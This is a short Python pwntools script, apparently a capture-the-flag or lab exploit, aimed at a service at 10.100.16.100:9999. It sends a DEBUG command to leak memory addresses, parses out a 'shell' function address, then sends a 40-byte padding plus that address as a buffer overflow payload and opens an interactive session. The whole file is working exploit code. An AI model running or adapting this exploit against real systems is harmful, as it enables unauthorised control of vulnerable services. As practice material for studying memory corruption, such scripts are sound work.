from pwn import *
import re

HOST = "10.100.16.100"
PORT = 9999

context.log_level = "info"

p = remote(HOST, PORT)

p.recvuntil(b"cmd> ")
p.send(b"DEBUG\n")

data = p.recvuntil(b"Password: ")
print(data.decode(errors="ignore"))

m = re.search(rb"userpass @ (0x[0-9a-f]+) shell @ (0x[0-9a-f]+)", data)
assert m, "leak parsing failed"

userpass = int(m.group(1), 16)
shell = int(m.group(2), 16)

log.success(f"userpass = {hex(userpass)}")
log.success(f"shell    = {hex(shell)}")

offset = 40
payload = b"A" * offset + p64(shell)[:6]

p.send(payload)
p.interactive()
